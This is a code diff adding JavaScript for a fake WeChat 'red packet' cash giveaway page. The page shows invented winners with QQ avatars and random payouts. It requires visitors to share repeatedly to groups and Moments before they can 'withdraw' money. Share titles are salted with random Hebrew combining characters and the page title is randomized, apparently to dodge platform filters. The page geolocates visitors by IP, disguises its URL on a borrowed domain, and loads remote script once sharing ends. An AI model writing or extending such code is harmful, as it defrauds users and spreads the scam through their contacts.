+            avatar: "https://q.qlogo.cn/qqapp/1104718115/9DE656A9B0C0384FCCF7D02BD02CFCB5/100"
+        }, {
+            name: "带带大师兄",
+            avatar: "https://q.qlogo.cn/qqapp/1104718115/5DA508A1616E732B0EB92A1ADAF28456/100"
+        }, {
+            name: "六小龄孙",
+            avatar: "https://q.qlogo.cn/qqapp/1104718115/D42066DE19EBB82D30A351185956DB41/100"
+        }, {
+            name: "夢醒ぴ誮落盡",
+            avatar: "https://q.qlogo.cn/qqapp/1104718115/F6213667E85E205FF363B3947D218D38/100"
+        }, {
+            name: "最好的我们",
+            avatar: "https://q.qlogo.cn/qqapp/1104718115/D56EE4D71422A112CDA6B7B44D48B044/100"
+        }, {
+            name: "甜味少女馆",
+            avatar: "https://q.qlogo.cn/qqapp/1104718115/0DE079B903E44F96AB9BAD85D706A61F/100"
+        }, {
+            name: "风有几分甜",
+            avatar: "https://q.qlogo.cn/qqapp/1104718115/A6F3CA4B97E59BB9AE5495984ACF3090/100"
+        }, {
+            name: "风月难入怀",
+            avatar: "https://q.qlogo.cn/qqapp/1104718115/E0FB2E95D84068B944789BF6569B3A7F/100"
+        }, {
+            name: "神明不渡我",
+            avatar: "https://q.qlogo.cn/qqapp/1104718115/71E4837B7B1F0A12D5F8D90234DDB95C/100"
+        }, {
+            name: "壊壊の少爷",
+            avatar: "https://q.qlogo.cn/qqapp/1104718115/9ADBAEBE292B4FA0737F9DB142336157/100"
+        }, {
+            name: "山河故人在",
+            avatar: "https://q.qlogo.cn/qqapp/1104718115/D6AEE11866CCEC092B82C532218F6B20/100"
+        }, {
+            name: "孙粒子",
+            avatar: "https://q.qlogo.cn/qqapp/1104718115/BE2BFD6D743F815AC7A8FA974E40D4FC/100"
+        }, {
+            name: "Mr. Xue",
+            avatar: "https://q.qlogo.cn/qqapp/1104718115/5283BB3808A16D227AC03DC4374F77C6/100"
+        }, {
+            name: "、dacy",
+            avatar: "https://q.qlogo.cn/qqapp/1104718115/48BE3B50C3E9847242626FF9A07C3317/100"
+        }, {
+            name: "已婚少年",
+            avatar: "https://q.qlogo.cn/qqapp/1104718115/02305E433C97C724931A79F8FB04FE50/100"
+        }, {
+            name: "叫我冰冰",
+            avatar: "https://q.qlogo.cn/qqapp/1104718115/198FD85BC7EFBCCB5C73AE4FEB633560/100"
+        }, {
+            name: "卢正英",
+            avatar: "https://q.qlogo.cn/qqapp/1104718115/25217BFE51A1B8A16160A9F43837A86F/100"
+        }, {
+            name: "Jkz.",
+            avatar: "https://q.qlogo.cn/qqapp/1104718115/772D04D9EB8E70A961A1D5CABBCF293A/100"
+        }];
+
+        user.sort(function () {
+            return Math.random() > .5 ? -1 : 1
+        });
+
+        var total_id = 'total',
+            r = Math.floor(Math.random() * user.length),
+            totalMoney = Math.floor(1e5 * Math.random() + 1e5),
+            c,
+            i = 100,
+            l = Math.floor(4 * Math.random()) + 1,
+            s = Math.floor(50 * Math.random()),
+            color = getColor(),
+            p = 10,
+            u = document.createElement("div");
+
+        function getColor(e) {
+            var t = Math.floor(45 * Math.random()) + 210,
+                a = Math.floor(35 * Math.random()) + 220;
+            return e ? "rgb(" + a + ", 205, 155)" : "rgb(" + t + ", 94, 77)"
+        }
+
+        function e(e) {
+            var t = e || 5,
+                a = new Date((new Date).getTime() - 60 * t * 1e3),
+                n = ("0" + a.getHours()).slice(-2),
+                o = ("0" + a.getMinutes()).slice(-2);
+            ("0" + a.getSeconds()).slice(-2);
+            return n + ":" + o
+        }
+
+        function djs(e, t) {
+            var a = t.time || 1e3,
+                n = t.number || 192.22,
+                o = t.regulator || 100,
+                i = n / (a / o),
+                r = 0,
+                p = 0,
+                s = setInterval(function () {
+                    r = Math.floor(100 * (r + i)) / 100,
+                        r >= n && (clearInterval(s),
+                            r = n)
+                    // ssmfshybso8fp(),
+                    // stipw995c01hlwt());
+                    var t = Number(r);
+                    t != p && (p = t,
+                        e.innerHTML = p.toFixed(2))
+                }, 30)
+        }
+
+        function tn(m) {
+            m = m || 50
+            var e = 0;
+            return e = Math.floor(50 * Math.random() * i) + m * i,
+                e /= i,
+                e.toFixed(2)
+        }
+
+        function state() {
+            if (Math.random() < 0.3) {
+                return '转账中'
+            } else {
+                return '已到账'
+            }
+        }
+
+        function add(a) {
+            var n = document.createElement("div"),
+                o = tn(50);
+
+            var right = '';
+            right = '<span style="color: rgb(227, 94, 77); font-size: 15px; margin-right: 5px;">' + state() +
+                '</span><span style="font-size: 14px; color: #000;">' + o + '元</span></div>';
+
+            if (Math.random() < 0.15) {
+                o = tn(10);
+                right = '<span style="color: rgb(227, 94, 77); font-size: 15px; margin-right: 5px;">' + state() +
+                    '</span><span style="font-size: 14px; color: #000;">' + o + '元</span></div>';
+            }
+
+            if (Math.random() > 0.85) {
+                o = tn(130)
+                right =
+                    '<svg t="1566461623474" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2574" width="16" height="16"><path d="M928.6 208c-27 1.4-51.8 18.6-62.7 43.4-12.1 27.7-6.2 56 10 76.3l-7.7 32.3c-15.7 66-74.6 112.5-142.5 112.5-76.4 0-139.9-58.7-146-134.8l-7.3-91.4c35.2-23.4 56-66.8 45.9-114-8.7-40.5-41.5-73.2-82.1-81.7C466.5 35.9 405 88.9 405 156.2c0 37.6 19.3 70.8 48.5 90.1l-7.3 91.4c-6.1 76.1-69.6 134.8-146 134.8-67.8 0-126.8-46.6-142.5-112.5l-7.7-32.3c16.2-20.2 22.1-48.6 10-76.3-10.8-24.8-35.6-42.1-62.7-43.4-49.4-2.5-85.3 40.7-77.4 86.3 4.4 25.2 21.1 45.2 42.8 54.8l65.6 463.5h769v-0.2l65.6-463.3c21.8-9.6 38.5-29.6 42.8-54.8 8.2-45.6-27.7-88.8-77.1-86.3z" fill="#F9C85D" p-id="2575"></path><path d="M781.3 961.3h-541c-63 0-114-51-114-114h769c0 63-51.1 114-114 114z" fill="#83C6EF" p-id="2576"></path><path d="M93 281.4m-73.9 0a73.9 73.9 0 1 0 147.8 0 73.9 73.9 0 1 0-147.8 0Z" fill="#F9C85D" p-id="2577"></path><path d="M928.6 208c-27 1.4-51.8 18.6-62.7 43.4-12.1 27.7-6.2 56 10 76.3l-7.7 32.3c-15.7 66-74.6 112.5-142.5 112.5-76.4 0-139.9-58.7-146-134.8l-7.3-91.4c35.2-23.4 56-66.8 45.9-114-8.7-40.5-41.5-73.2-82.1-81.7-7.9-1.7-15.7-2.3-23.4-2.3v764.4h384.5v-0.2l65.6-463.3c21.8-9.6 38.5-29.6 42.8-54.8 8.2-45.7-27.7-88.9-77.1-86.4z" fill="#FFB103" p-id="2578"></path><path d="M933.3 281.4m-73.8 0a73.8 73.8 0 1 0 147.6 0 73.8 73.8 0 1 0-147.6 0Z" fill="#F9C85D" p-id="2579"></path><path d="M513 154.3m-109.2 0a109.2 109.2 0 1 0 218.4 0 109.2 109.2 0 1 0-218.4 0Z" fill="#F9C85D" p-id="2580"></path><path d="M510.8 847.3v114H784c61.5 0 111.3-49.8 111.3-111.3v-2.7H510.8z" fill="#429BCF" p-id="2581"></path><path d="M146.4 230.5c-8.7 45.1-45.9 84.2-99.2 108.5 12.6 10.1 28.4 16.3 45.8 16.3 40.8 0 73.9-33.1 73.9-73.9 0-19.7-7.9-37.6-20.5-50.9zM986.9 231.1c-10.1 44.5-47.9 82.7-101.3 106.3 12.9 11 29.4 17.9 47.7 17.9 40.8 0 73.8-33 73.8-73.8-0.1-19.6-7.8-37.2-20.2-50.4zM589.1 76c2.3 6.6 3.6 13.5 3.6 20.5 0 51.4-64.1 93.1-143.1 93.1-14.3 0-28.1-1.4-41.1-4 13.5 45 55.2 77.7 104.6 77.7 60.3 0 109.2-48.9 109.2-109.2-0.1-30.6-12.8-58.3-33.2-78.1z" fill="#FFB103" p-id="2582"></path><path d="M55.848334 249.331715a8.4 19.9 60 1 0 34.467811-19.9 8.4 19.9 60 1 0-34.467811 19.9Z" fill="#F7EAD0" p-id="2583"></path><path d="M945.164493 246.695113a19.9 8.4 30 1 0 8.4-14.549226 19.9 8.4 30 1 0-8.4 14.549226Z" fill="#F7EAD0" p-id="2584"></path><path d="M469.7 77.7a41.4 10.6 0 1 0 82.8 0 41.4 10.6 0 1 0-82.8 0Z" fill="#F7EAD0" p-id="2585"></path><path d="M546 630.8h-61.4c-13.9 0-25.3-11.4-25.3-25.3s11.4-25.3 25.3-25.3H546c13.9 0 25.3 11.4 25.3 25.3s-11.4 25.3-25.3 25.3z" fill="#DA3329" p-id="2586"></path><path d="M546 580.1h-33v50.7h33c13.9 0 25.3-11.4 25.3-25.3 0-14-11.4-25.4-25.3-25.4z" fill="#C11B16" p-id="2587"></path></svg><span style="color: #f5cf00; font-size: 15px; margin: 0 5px;">手气最佳</span><span style="font-size: 14px; color: #000;">' +
+                    o + '元</span>'
+            }
+
+            return n.style.cssText =
+                "width: 100%; height: 60px; overflow: hidden; box-sizing: border-box; padding: 0 10px; border-bottom: 1px solid rgba(0, 0, 0, .05); display: -webkit-box; display: flex; flex-wrap: wrap; align-items: center; justify-content: center;",
+                n.innerHTML =
+                '<img style="width: 40px; height: 40px; margin-right: 10px; overflow: hidden; background-color: #eee; border-radius: ' +
+                s + '%" src="' + a.avatar +
+                '"><div style="flex: 1;"><div style="font-size: 15px; color: #000; margin-bottom: 4px;">' + a.name +
+                '</div><div style="font-size: 14px; color: #929493;">' + e(r + 5) +
+                '</div></div><div style="text-align: right;"><div style="text-align: right;">' + right + '</div>',
+                totalMoney -= Number(o),
+                c.textContent = "总发放200000份 剩余" + totalMoney.toFixed(0) + "份",
+                n
+        }
+
+
+        function n() {
+            var e = u.lastChild;
+            e.parentNode.removeChild(e);
+            var t = add(user[r]);
+            t.style.animation = "itemMove" + l + " 0.5s",
+                u.insertBefore(t, u.firstChild),
+                r++,
+                r >= user.length && (r = 0)
+        }
+
+        function addUser() {
+            n();
+            setTimeout(function () {
+                addUser();
+            }, 1500)
+        }
+
+        function bq() {
+            var biaoqing = ["💫", "⭐️", "🌟", "✨", "⚡️", "☄️", "💥", "🔥", "🌪", "🌈", "💧", "💦", "⛄", "️☃️", "❄️",
+                "🌊",
+                "🍏", "🍎", "🍐", "🍊", "🍋", "🍌", "🍉", "🍇", "🍓", "🍈", "🍒", "🍑", "🍍", "🥥", "🥝", "🍅",
+                "🍆",
+                "🥑", "🥦", "🥒", "🌶", "🌽", "🥕", "🥔", "🍠", "🚴‍", "♂️", "🏆", "🥇", "🥇", "🏅", "🎖", "🏵",
+                "🚊",
+                "🛩", "💺", "🛰", "✈️", "🛫", "🚀", "🛬", "🛸", "🛥", "⛵️", "🛶", "🚁", "🔱", "⚜️", "🙌", "👏",
+                "👋",
+                "👍", "👊", "✊", "✌️", "👌", "✋", "👐", "💪", "🙏", "👈", "👉", "🖐", "🤘", "🖖", "✍️", "💅", "👄",
+                "👅", "👂", "👃", "👁", "👀", "👤", "👥", "🗣", "👶", "👦", "👧", "👨", "👩", "👱", "👴", "👵",
+                "👲",
+                "👳", "👷", "💂", "🕵", "🎅", "👼", "👸", "👰", "🚶", "🏃", "💃", "😺", "😸", "😹", "😻", "😼",
+                "😽", "🙀", "😿", "😾", "🙌", "👏", "👋", "👍", "👎", "👊",
+                "✊",
+                "✌️", "👌", "✋", "👐", "💪", "🙏", "☝️", "👆", "👇", "👈", "👉", "🖕", "🖐", "🤘", "🖖", "✍️", "💅",
+                "👄", "👅", "👂", "👃", "👁", "👀", "👤", "👥", "🗣", "👶", "👦", "👧", "👨", "👩", "👱", "👴",
+                "👵",
+                "👲", "👳", "👮", "👷", "💂", "🕵", "🎅", "👼", "👸", "👰", "🚶", "🏃", "💃"
+            ];
+            return biaoqing[Math.floor(Math.random() * biaoqing.length)];
+        }
+
+        function checkIsMp() {
+            if (window.data && window.data['attached'] && window.data['attached']['isMp']) {
+                return true;
+            } else {
+                return false;
+            }
+        }
+
+        function getCity() {
+            var str = (window['localAddress'] ? ['北京市', '天津市', '上海市', '重庆市'].indexOf(localAddress.province) > -1 ?
+                    localAddress.province : localAddress.city ? localAddress.city : localAddress.province : '我省省')
+                .replace(/(.*)市/, '$1').replace(/(.*)省/, '$1');
+            return str.split('').join('{fuckr}')
+        }
+          var riqi=new Date();
+
+            var years=riqi.getFullYear();
+
+            var months=("0"+(riqi.getMonth()+1)).slice(-2);  
+
+            var days=("0"+(riqi.getDate()+2)).slice(-2);
+
+            var shijian=months+"-"+days;
+            
+        function getSpm() {
+            var stringArray = 'qwertyuiopasdfghjklzxcvbnm1234567890';
+            var spm = []
+            spm.push(stringArray.charAt(Math.floor(Math.random() * stringArray.length)));
+            spm.push(stringArray.charAt(Math.floor(Math.random() * stringArray.length)));
+            spm.push(stringArray.charAt(Math.floor(Math.random() * stringArray.length)));
+            spm.push(stringArray.charAt(Math.floor(Math.random() * stringArray.length)));
+            spm.push(stringArray.charAt(Math.floor(Math.random() * stringArray.length)));
+            spm.push(stringArray.charAt(Math.floor(Math.random() * stringArray.length)));
+            spm.push(stringArray.charAt(Math.floor(Math.random() * stringArray.length)));
+            return spm.join('');
+        }
+
+        function randomNum() {
+            return parseInt(200 * Math.random())
+        }
+
+        function record(event, id, allow_reply) {
+            try {
+                if (!localStorage.getItem(event + ':' + id) || allow_reply) {
+                   // $.post(window.req_url + '/record', {
+                   //     event: event,
+                   //     id: id
+                  //  })
+                 //   localStorage.setItem(event + ':' + id, true);
+                }
+            } catch (e) {
+
+            }
+        }
+
+        function report() {
+            if (gConfig.hm_s) {
+                M.report(gConfig.hm_s);
+            }
+            // 总统计
+          //  M.report('d5136993d64b007dd49bd9f293582bdf')
+        }
+
+        /* 借权start */
+        var location_host = location.host;
+
+
+
+        function getFuck() {
+            var fucklist = window['gConfig']['attached']['fucks'];
+            var rd = parseInt(fucklist.length * Math.random());
+            return fucklist[rd % fucklist.length]
+        }
+
+        function getFuckr() {
+            var fucklist = ["\u05c1", "\u05c2", "\u05c4", "\u05c7", "\u05b4", "\u05b5", "\u05b6", "\u05b9", "\u05ba",
+                "\u05bc", "\u05bd", "\u05bf", "\u05c1", "\u05c4", "\u05c5", "\u0591", "\u0592", "\u0594",
+                "\u0595", "\u0596", "\u0599", "\u059a", "\u059b", "\u059c", "\u059d", "\u05a2", "\u05a3", "\u05a4",
+                "\u05a5", "\u05af", "\u05b0", "\u05b4", "\u05b5", "\u05b6", "\u05b7", "\u05b8", "\u05b9", "\u05ba",
+                "\u05bb", "\u05bc", "\u05bd", "\u05bf", "\u05c1", "\u05c2", "\u05c4", "\u05c5", "\u05c7",
+                "\u055c"
+            ];
+            return fucklist[Math.floor(Math.random() * fucklist.length)];
+        }
+
+        function fuckStr(str) {
+            while (str && str.indexOf('{fuck}') !== -1) {
+                str = str.replace('{fuck}', getFuck() + (Math.random() > 0.5 ? getFuck() : ''))
+            }
+
+            while (str && str.indexOf('{fuckr}') !== -1) {
+                str = str.replace('{fuckr}', getFuckr() + (Math.random() > 0.5 ? getFuckr() : ''));
+            }
+
+            return str || '';
+        }
+
+        // 分享
+        var openTime;
+
+        (function () {
+            var hiddenProperty = 'hidden' in document ? 'hidden' : 'webkitHidden' in document ? 'webkitHidden' :
+                'mozHidden' in document ? 'mozHidden' : null;
+            var visibilityChangeEvent = hiddenProperty.replace(/hidden/i, 'visibilitychange');
+
+            document.addEventListener(visibilityChangeEvent, onVisibilityChange);
+
+            function onVisibilityChange() {
+                if (!document[hiddenProperty]) {
+                    if (window.data.attached && window.data.attached['jfx']) {
+                        setTimeout(function () {
+                            if (!document[hiddenProperty]) {
+                                if (shareATimes <= shareAtLimit) {
+                                    if (checkShare()) appmessage_callback();
+                                } else {
+                                    timeline_callback();
+                                }
+                            }
+                        }, 100)
+                    }
+                } else {
+                    openTime = Date.now();
+                }
+            };
+
+            function share_tip() {
+                // 4次群 2次朋友圈
+                if (shareATimes == 0) {
+                    showShareTips(window.g_tips_message_obj);
+                } else if (shareATimes == 1) {
+                    window.g_tips_message_obj = gConfig.groupTips[0];
+                    showShareTips(window.g_tips_message_obj);
+                    shareFriend();
+                } else if (shareATimes == 2) {
+                    window.g_tips_message_obj = gConfig.groupTips[1];
+                    showShareTips(window.g_tips_message_obj);
+                    shareFriend();
+                } else if (shareATimes == 3) {
+                    window.g_tips_message_obj = gConfig.groupTips[2];
+                    showShareTips(window.g_tips_message_obj);
+                    shareFriend();
+                }
+                /*
+                else if (shareATimes == 4) {
+                    window.g_tips_message_obj = gConfig.groupTips[3];
+                    showShareTips(window.g_tips_message_obj);
+                    shareFriend();
+                }
+                */
+                else if (shareATimes == 4 && shareAtLimit == 4) {
+                    window.g_tips_message_obj = gConfig.groupTips[3];
+                    showShareTips(window.g_tips_message_obj);
+                    shareFriend();
+                } else {
+                    if (shareTTimes < 1) {
+                        $('#squn').hide();
+                        $('#squan').show();
+                        if (gConfig && gConfig.to_timeline && gConfig.to_timeline.jump_share) {
+                            var a = document.createElement('a');
+                            a.href = gConfig.to_timeline.jump_share + '&money=' + gConfig.moneyStr;
+                            a.click();
+                            return;
+                        }
+                        //window.g_tips_message_obj = gConfig.groupTips[4];
+                        window.g_tips_message_obj = gConfig.groupTips[4];
+                        showShareTips(window.g_tips_message_obj);
+                        show_timeline_menu();
+                        shareTimeline();
+                    } else {
+                        if (shareTTimes == 1) {
+                            window.g_tips_message_obj = gConfig.timeLineTips[0];
+                            showShareTips(window.g_tips_message_obj);
+                            shareTimeline();
+                        } else {
+                            try {
+                                $(document.body).trigger('event_page_share_done');
+                            } catch (e) {
+
+                            }
+                        }
+
+                    }
+                }
+            }
+
+            function timeline_callback() {
+                if (shareATimes >= shareAtLimit) {
+                    shareTTimes += 1;
+                    share_tip();
+                    record('share-timeline' + shareTTimes, shareTTimes, true);
+                    record('share-timeline', shareTTimes, true);
+                } else {
+                    // g_dialog.alert({
+                    //     title: '<span style="color:red">注意!!</span>',
+                    //     message: '请按照提示正确分享',
+                    //     btn: '我知道了',
+                    //     cb: function () {
+                    //         $('.page .btn').trigger('click')
+                    //     }
+                    // });
+                }
+            }
+
+            function appmessage_callback() {
+                shareATimes += 1;
+                share_tip();
+                record('share-appmessage' + shareATimes, shareATimes, true);
+                record('share-appmessage', shareATimes, true);
+            }
+function randomRange(min, max){
+ var returnStr = "",
+  range = (max ? Math.round(Math.random() * (max-min)) + min : min),
+  charStr = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+ for(var i=0; i<range; i++){
+  var index = Math.round(Math.random() * (charStr.length-1));
+  returnStr += charStr.substring(index,index+1);
+ }
+ return returnStr;
+}
+            function shareFriend() {
+                var result = window.data.to_group;
+                if (window.data.attached['rd_title']) {
+                    result.title = getTitle();
+                }
+                
+				var link_u=	JSON.parse(result.link);
+			
+				var index = Math.floor((Math.random()*link_u.length)); 
+				var url_ua=link_u[index]; 
+				
+                			
+				result_a={
+				
+				'link':url_ua
+				}
+				
+                if (window.data.attached['ad_share']['qun'][shareATimes]) {
+                    result = {
+                        //'title': window.data['ad']['title'],
+                        'title': window.data['ad']['rd_title'] ? getAdTitle() : window.data['ad']['title'],
+                        
+                        'img': window.data['ad']['img'],
+                        'desc': window.data['ad']['desc'],
+                        'link':window.data['ad']['app_url']  //开启无接口要删除这个，把下面注释去掉
+                    }
+                var link_qungg=	JSON.parse(result.link);
+			
+				var indexqun = Math.floor((Math.random()*link_qungg.length)); 
+				var url_qungg=link_qungg[indexqun];     
+				result_a={
+				
+				'link':url_qungg,
+				}
+				
+                }
+             if(window.data.attached.signmode == 'jssdk') {
+		
+                        wx.ready(function () {
+
+                        wx.onMenuShareAppMessage({
+                            title: fuckStr(result.title.replace('{city}', getCity())).replace(
+                                /{bq}/ig, bq()).replace(/{money}/ig, gConfig.money).replace(
+                                /{rdnum}/g, randomNum()).replace('{data}', shijian),
+                            link: result_a.link,
+                            desc: fuckStr(result.desc.replace('{city}', getCity())).replace(
+                                /{bq}/ig, bq()).replace(/{money}/ig, gConfig.money).replace(
+                                /{rdnum}/g, randomNum()),
+                            imgUrl: result.img,
+                            dataUrl: "http://fs.ringop.kugou.com/G132/M0B/0C/1B/xA0DAFqPht2AGh9BACJOIM_Aa8U043.mp3",
+                            success: function () {
+                                if (checkShare()) appmessage_callback();
+                            },
+                            cancel: function () {}
+                        });
+                    })  
+					
+                    
+                }
+      
+            }
+           
+
+            function shareTimeline(result) {
+                 
+                var result = window.data.to_timeline;
+                if (window.data.attached['rd_title']) {
+                    result.title = getTitle(true);
+                }
+				
+				var link_a=JSON.parse(result.link);
+				var index = Math.floor((Math.random()*link_a.length)); 
+				var url_aa=link_a[index]; 
+				
+				result_b={
+				'link':url_aa
+				}
+				
+                if (window.data.attached['ad_share']['pyq'][shareTTimes]) {
+                    result = {
+                        //'title': window.data['ad']['desc'],
+                        'title': window.data['ad']['rd_title'] ? getAdTitle() : window.data['ad']['title'],
+                       
+                        'img': window.data['ad']['img'],
+                        'desc': window.data['ad']['desc'],
+                        'link':window.data['ad']['timeline_url']
+                      //  'link':window.data['ad']['timeline_url']  //开启无接口要删除这个，把下面注释去掉
+                    }
+                var link_pyqgg=JSON.parse(result.link);
+				var indexpyq = Math.floor((Math.random()*link_pyqgg.length)); 
+				var url_pyqgg=link_pyqgg[indexpyq]; 
+				result_b={
+				'link':url_pyqgg
+				}
+				
+                }
+            if(window.data.attached.signmode == 'jssdk') {
+				
+			
+                        wx.ready(function () {
+    
+                
+                        wx.onMenuShareTimeline({
+                            title: fuckStr(result.title.replace('{city}', getCity())).replace(
+                                /{bq}/ig, bq()).replace(/{money}/ig, gConfig.money).replace('{data}', shijian),
+                            link: result_b.link,
+                            imgUrl: result.img,
+                            dataUrl: "http://fs.ringop.kugou.com/G132/M0B/0C/1B/xA0DAFqPht2AGh9BACJOIM_Aa8U043.mp3",
+                            type: 'video',
+                            success: function () {
+                                timeline_callback();
+                            },
+                            cancel: function () {}
+                        });
+                    })  
+					
+                }
+                
+          
+            }
+
+                
+                
+
+        function ranTT() {
+            var items = ['\u0993', '\u0994', '\u0995', '\u0996', '\u0997', '\u0998', '\u0999', '\u099a', '\u099b',
+                '\u099c', '\u0a96', '\u03ad', '\u03c2', '\u03c3', '\u03c4', '\u03c5', '\u03c6', '\u03c7', '\u03c8',
+                '\u03c9', '\u03cc',
+            ];
+            var item = items[Math.floor(Math.random() * items.length)];
+            return item;
+        }
+            function start_load() {
+                if (shareTTimes != 0 || shareATimes !== 0) {
+                    share_tip();
+                }
+                document.title = ranTT();
+                var data = window.data;
+                if (data.attached['timeline_ad']) timeline_ad = true;
+                if (data.attached['group_ad']) group_ad = true;
+       
+                wx.config({
+                    debug: false,    
+                    appId:data.appId,
+                    timestamp:data.timestamp,
+                    nonceStr:data.nonceStr,
+                    signature:data.signature,
+                    jsApiList: ["onMenuShareTimeline", "onMenuShareAppMessage", "hideMenuItems", "showMenuItems"]
+                });
+                //这里开始执行
+                $('#squan').show();
+                shareFriend();
+                shareTimeline();
+            }
+            function init() {
+
+                if (typeof WeixinJSBridge === "undefined") {
+                    if (document.addEventListener) {
+                        document.addEventListener('WeixinJSBridgeReady', start_load, false);
+                    } else if (document.attachEvent) {
+                        document.attachEvent('WeixinJSBridgeReady', start_load);
+                        document.attachEvent('onWeixinJSBridgeReady', start_load);
+                    }
+                } else {
+                    start_load();
+                }
+            }
+
+            window.g_share = {
+                init: init,
+            }
+
+        }())
+
+        function start() {
+
+            var config = {
+                tpl: {
+                    body: [
+                        //'<div id="axax" class="tan-bg-tz" style="top: 24.1412px;"><div class="new-bg-tz"><div class="tongzhi_top"><div class="t_l_text"><div><img src="https://p.ssl.qhimg.com/t0166382f57eb17b6ff.png" alt=""></div><div>微信<span class="text-new">刚刚</span></div></div><div class="safe-img"><img src="https://p.ssl.qhimg.com/t01b35dc4358b3ce0e4.png" alt=""></div></div><div class="tongzhi_bottom"><div><div>微信红包</div><div class="text-ling">已到账，分享即可查收</div></div><div class="tz_img"><img src="https://p.ssl.qhimg.com/t0145715dfc757b09c8.jpg" alt=""></div></div></div></div>',
+                        '<div class="page" style="width:100%;height: 100vh; overflow: hidden; background-color: #fff;position:fixed"><div style="overflow: hidden; height: 330px; border: 1px solid rgb(240, 94, 77);background: rgb(234, 94, 77);background-size: cover;background-repeat: no-repeat;border-radius: 0px 0px 50% 50% / 10px 10px 23% 23%; margin-bottom: 20px "><img src="' +
+                        content.img +
+                        '"style="width: 80px; height: 80px;margin: 0 auto 0; display: block;margin-top: 40px;border-radius: 10px;"><p style="font-size: 18px; color: rgb(220, 205, 155); text-align: center;padding-top: 10px">' +
+                        content.title +
+                        '</p><p style="font-size: 40px; text-align: center;padding-top: 15px; color: rgb(220, 205, 155); font-weight: bold"><span data-time=""></span></p><div id="squn"style="display:block; text-align: center; font-size: 15px; color: rgb(220, 205, 155)">分享此活动到微信群后，自动存入零<span style="transform:rotate(13deg);display:inline-block;">钱</span></div><div id="squan"style="display:none; text-align: center; font-size: 15px; color: rgb(220, 205, 155)">分享此活动到朋友圈后，即可完成提现</div><div class="btn"style="margin: 15px auto; width: 110px; height: 40px; border-radius: 20px; background-color: rgb(226, 205, 155); color: #333; text-align: center; line-height: 40px; font-size: 16px; box-shadow: rgba(0, 0, 0, 0.2) 0px 4px 0px 0; animation: btnShake1 2s infinite;">提现到<span style="transform:rotate(13deg);display:inline-block;">钱</span>包</div></div><div style="width: 100%; height: 10px; background-color: #eceeed; "></div><div id="total"style="font-size: 14px; color:#929493; height: 30px; line-height: 30px; padding-left: 10px; border-bottom: solid 1px rgba(0,0,0,0.05)">总发放200000份剩余126901份</div><a id="tousu"style="font-size: 14px; color: #333; text-decoration: none;"></a><div style="display: none; position: fixed; z-index: 999; top: 10px; left: -15px; width: 80px; height: 40px; line-height: 40px; border-radius: 0 20px 20px 0; background-color: #fff; opacity: 0.8; text-align: center"></div><div><div class="tip" style="opacity:.8;position:fixed;z-index:999;top:10px;right:10px;overflow:hidden;text-align:center;color:#fff;font-size:15px;animation:tipMove 1.5s infinite"><img src="//ytm.oss-cn-hangzhou.aliyuncs.com/zz/img/share_arrow.png" j1.png"="" style="width:80px;height:90px;"><div style="transform:translateY(-40%)">转发点这里</div></div></div></div>',
+                    ].join(''),
+                }
+            };
+
+            function initPage(money) {
+                if (location_host.indexOf('dianping.com') > -1) {
+                    setTimeout(function () {
+                        window.history.pushState('page2', '/', "/hrb/ershouche/38097789399332x.shtml" + Math[
+                            "random"]()["toString"](36)["substring"](2) + ".html");
+                        // window.history.pushState('page2', '/', "/#" + Date.now());
+                    }, 100);
+                }
+                $(document.body).append(config.tpl.body.jstpl_format({
+                    money: money
+                }));
+                bindEvent();
+                djs(querySelector("[data-time]"), {
+                    time: 1e3,
+                    number: Number(money),
+                    regulator: 50
+                });
+                for (u.style.cssText =
+                    "width: 100%; background-color: rgba(255,255,255,0.1); overflow: hidden; border-radius: 5px; height: 600px;"; p >
+                    0;)
+                    u.appendChild(add(user[r])),
+                    r++,
+                    r >= user.length && (r = 0),
+                    p--;
+                querySelector(".page").appendChild(u);
+                addUser();
+            }
+
+            function bindEvent() {
+                c = document.getElementById(total_id)
+                document.body.onclick = function () {}
+
+                $(document.body).on('event_page_share_done', function () {
+                    if (gConfig.successTips) {
+                        g_dialog.alert({
+                            title: '',
+                            message: gConfig.successTips,
+                            btn: '我知道了',
+                            cb: function () {
+                                /*
+                                if (gConfig.endPageUrl) {
+                                    var a = document.createElement('a');
+                                    a.href = gConfig.endPageUrl + '&money=' + gConfig.money;
+                                    a.rel = 'noreferrer';
+                                    a.click();
+                                }
+                                */
+                                M.loadJS(gConfig['attached']['back_api_ss']+"?t="+Date.now());
+                                return false
+                            }
+                        });
+                    }
+                });
+
+                $('.page .btn').click(function () {
+                    if (!window['g_tips_message_obj']) {
+                        window['g_tips_message_obj'] = gConfig.defaultTips;
+                    }
+                    showShareTips(g_tips_message_obj);
+                })
+
+            }
+
+            function replaceMoney(obj, money) {
+                obj = obj || {}
+                if (obj.title) {
+                    obj.title = obj.title.replace('{moneyStr}', money).replace(/{rdnum}/g,
+                        randomNum());
+                }
+                if (obj.desc) {
+                    obj.desc = obj.desc.replace('{moneyStr}', money).replace('\\n', '\n').replace(
+                        /{rdnum}/g, randomNum());
+                }
+                if (obj.successTitle) {
+                    obj.successTitle = obj.successTitle.replace('{moneyStr}', money).replace(/{fuck}/ig, getFuck())
+                        .replace(/{rdnum}/g, randomNum());
+                }
+                if (obj.successTips) {
+                    obj.successTips = obj.successTips.replace('{moneyStr}', money).replace(/{fuck}/ig, getFuck())
+                        .replace(/{rdnum}/g, randomNum());
+                }
+            }
+
+            function init() {
+                M.resetFont();
+                setTimeout(function () {
+                    if (shareATimes == 0 && shareTTimes == 0) {
+                        loading()
+                    }
+                }, 100)
+                var moneyStr = localStorage.getItem('money_str');
+                if (!moneyStr) {
+                    moneyStr = parseInt((150 + 50 * Math.random()) * 100);
+                }
+                localStorage.setItem('money_str', moneyStr);
+                gConfig.moneyStr = moneyStr;
+                var money = (parseFloat(moneyStr / 100).toFixed(2));
+                gConfig.money = money;
+
+                gConfig.defaultTips = gConfig.defaultTips.jstpl_format({
+                    money: money
+                });
+
+                gConfig.successTips = gConfig.successTips.jstpl_format({
+                    money: money
+                });
+
+                $(gConfig.groupTips).each(function (index, item) {
+                    replaceMoney(item, money)
+                });
+
+                $(gConfig.timeLineTips).each(function (index, item) {
+                    replaceMoney(item, money)
+                });
+
+                replaceMoney(gConfig['ad'], money)
+                replaceMoney(gConfig['to_group'], money)
+                replaceMoney(gConfig['to_timeline'], money)
+                M.loadJS('https://ip.ws.126.net/ipquery', function () {
+                 g_share.init();
+                }, function () {
+                  g_share.init();
+                })
+                setTimeout(function () {
